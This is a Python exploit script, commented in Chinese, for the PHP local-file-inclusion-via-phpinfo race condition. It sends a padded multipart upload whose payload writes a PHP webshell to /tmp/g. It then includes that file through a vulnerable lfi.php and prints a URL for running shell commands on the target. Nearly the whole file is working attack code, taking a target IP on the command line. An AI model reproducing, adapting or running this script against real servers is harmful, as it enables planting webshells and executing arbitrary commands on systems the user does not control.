#!/usr/bin/python
# 参考: https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
# 以下代码行用于优化，但在某些Python 2环境中可能会导致问题
# 特别是当future模块版本>0.16时，可能会造成回退困难
# from builtins import range
from __future__ import print_function
import sys
import threading
import socket

def setup(host, port):
    # 设置用于检测的标签和Payload
    TAG = "Security Test"
    # 创建PHP webshell的Payload
    PAYLOAD = """%s\r
<?php $c=fopen('/tmp/g','w');fwrite($c,'<?php passthru($\_GET["f"]);?>');?>\r""" % TAG
    
    # 构建POST请求的数据部分
    REQ1_DATA = """-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    
    # 创建大量填充数据，用于触发PHP临时文件创建
    padding = "A" * 5000
    
    # 构建POST请求头和数据
    REQ1 = """POST /phpinfo.php?a=""" + padding + """ HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=""" + padding + """\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """ + padding + """\r
HTTP_ACCEPT_LANGUAGE: """ + padding + """\r
HTTP_PRAGMA: """ + padding + """\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" % (len(REQ1_DATA), host, REQ1_DATA)
    
    # 修改此行以匹配目标LFI脚本的路径
    LFIREQ = """GET /lfi.php?load=%%s%%00 HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    # 创建两个socket连接
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # 连接到目标服务器
    s.connect((host, port))
    s2.connect((host, port))
    
    # 发送phpinfo请求
    s.send(phpinforeq)
    d = ""
    
    # 读取响应，查找临时文件名
    while tag not in d:
        d += s.recv(4096)
    
    # 提取临时文件名
    tmp_file = d.split('tmp_name] =&gt; ')[1].split('\n')[0]
    
    # 构建LFI利用URL
    lfireq = lfireq % (tmp_file, host)
    
    # 发送LFI请求
    s2.send(lfireq)
    
    # 读取响应
    d2 = ""
    while len(d2) < 1000:
        d2 += s2.recv(4096)
    
    # 关闭连接
    s.close()
    s2.close()
    
    # 检查是否成功
    if 'Security Test' in d2:
        print('\n[+] 成功! 使用以下URL执行命令:')
        print('http://%s/lfi.php?load=/tmp/g&f=id' % host)
    else:
        print('[-] 利用失败')

def main():
    print('\nPHP 5.x < 5.3.12 / 5.4.x < 5.4.2 本地文件包含利用工具')
    print('参考: https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf')
    
    if len(sys.argv) < 2:
        print('\n用法: %s <目标IP> [端口]' % sys.argv[0])
        print('示例: %s 192.168.1.100 80' % sys.argv[0])
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    
    print('\n[+] 目标: %s:%d' % (host, port))
    
    # 准备请求
    phpinforeq, tag, lfireq = setup(host, port)
    
    # 尝试多个偏移量
    for i in range(0, 50):
        print('\r[+] 尝试偏移量 %d' % i, end='')
        sys.stdout.flush()
        
        # 创建线程执行利用
        t = threading.Thread(target=phpInfoLFI, args=(host, port, phpinforeq, i, lfireq, tag))
        t.daemon = True
        t.start()
        
        # 等待线程完成
        t.join(5)
    
    print('\n[+] 完成')

if __name__ == '__main__':
    main()
